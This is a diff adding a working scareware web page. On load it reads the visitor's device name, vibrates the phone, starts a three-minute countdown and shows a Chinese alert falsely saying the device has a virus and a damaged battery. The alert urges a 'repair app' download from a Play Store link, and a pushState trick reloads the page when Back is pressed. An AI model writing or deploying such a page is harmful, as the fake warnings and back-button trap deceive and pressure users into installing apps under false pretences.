@@ -1,0 +1,101 @@
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script type='text/javascript' src="//wurfl.io/wurfl.js"></script>
+<script type="text/javascript">
+
+    jQuery(document).ready(function($) {
+
+      if (window.history && window.history.pushState) {
+
+        $(window).on('popstate', function() {
+          var hashLocation = location.hash;
+          var hashSplit = hashLocation.split("#!/");
+          var hashName = hashSplit[1];
+
+          if (hashName !== '') {
+            var hash = window.location.hash;
+            if (hash === '') {
+              //alert('Back button was pressed.');
+              location.reload(false);
+            }
+          }
+        });
+
+        window.history.pushState('forward', null, null);
+      }
+
+    });
+
+
+    function lala() {
+        document.body.innerHTML = "<button width=\x22150%\x22 type=\x22submit\x22 onclick=\x22javascript:location.href='https://play.google.com/store/apps/details?id=com.nianticlabs.pokemongo&hl=en'\x22><img src=\x22http://s35.podbean.com/pb/89d7273bc6ae276b8927b6cad83ab32e/578cfa0c/data2/blogs60/771188/uploads/googlePlay-logo.png\x22 style=\x22height:200px;width:200px\x22 alt=\x22Submit\x22></button><div><span id=\x22time\x22></span></div>";
+
+        isVibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        if (isVibrate) {
+            navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
+            //navigator.vibrate([1000,3000,1000]);
+        }
+        /*
+        setTimeout(function(){
+            alert("ddfdf\n\nfgf\n\nfgfgfg\n\nfgfgfgf"); 
+            isVibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+            if (isVibrate) {
+        //navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
+            navigator.vibrate([1000]);
+        }, 500);
+        */
+
+        function startTimer(duration, display) {
+            var start = Date.now(),
+                diff,
+                minutes,
+                seconds;
+            function timer() {
+                // get the number of seconds that have elapsed since 
+                // startTimer() was called
+                diff = duration - (((Date.now() - start) / 1000) | 0);
+
+                // does the same job as parseInt truncates the float
+                minutes = (diff / 60) | 0;
+                seconds = (diff % 60) | 0;
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = "剩余: " + minutes + ":" + seconds + " 分钟!"; 
+
+                if (diff <= 0) {
+                    // add one second so that the count down starts at the full duration
+                    // example 05:00 not 04:59
+                    start = Date.now() + 1000;
+                }
+            };
+            // we don''t want to wait a full second before the timer starts
+            timer();
+            setInterval(timer, 1000);
+        }
+
+        var threeMinutes = 60 * 3,
+        display = document.querySelector('#time');
+        startTimer(threeMinutes, display);
+
+        var deviceModel = WURFL.complete_device_name;
+
+        var onl = "警告!\n\n你的 " + deviceModel + " 感染了病毒并且电池已经损坏!\n\n请关闭此对话框, 3 分钟内下载 repair app 修复 。\n\n**如不修复，请自行承担风险**" 
+        setTimeout(function(){ 
+            alert(onl);
+            }, 1000);
+
+
+    }
+
+    window.onload = lala;
+</script>
+</head>
+<body>
+    <div><span id="time"></span></div>
+</body>
+</html>
+
+
